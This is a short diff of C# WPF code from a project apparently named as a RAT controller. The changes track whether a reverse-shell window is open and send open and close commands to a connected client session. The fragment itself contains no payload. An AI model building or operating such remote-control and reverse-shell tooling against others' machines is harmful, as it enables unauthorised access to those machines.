@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
@@ -27,11 +28,13 @@ namespace ArkerRatWpfVersion
             reverseShellTextOutput.Document.Blocks.Clear();
             reverseShellTextOutput.IsReadOnly = true;
             clientSession = session;
+            clientSession.reverseShellWindowIsAlreadyOpen = true;
             clientSession.SendData("§ReverseShell§");
         }
         private async void CloseReverseShell(object sender, RoutedEventArgs e)
         {
             await clientSession.SendData("§ReverseShell§§close§");
+            clientSession.reverseShellWindowIsAlreadyOpen = false;
             Close();
         }
 
@@ -57,7 +60,6 @@ namespace ArkerRatWpfVersion
         private string checkIfDataIsNew = "1";
         public async Task ReversShellFunction()
         {
-
             if (data.Length > 1 && data != checkIfDataIsNew)
             {
                 reverseShellTextOutput.AppendText(data);
